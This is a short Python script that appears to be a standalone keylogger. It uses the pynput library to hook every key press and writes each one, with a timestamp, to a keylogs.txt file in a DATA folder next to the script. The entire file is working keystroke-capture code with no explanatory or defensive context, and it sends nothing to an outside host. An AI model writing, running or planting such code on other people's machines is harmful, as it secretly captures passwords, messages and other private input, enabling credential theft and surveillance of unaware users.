from pynput.keyboard import Listener
import logging, os

log_dir = os.path.dirname(os.path.abspath(__file__)) + '\DATA\\'

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()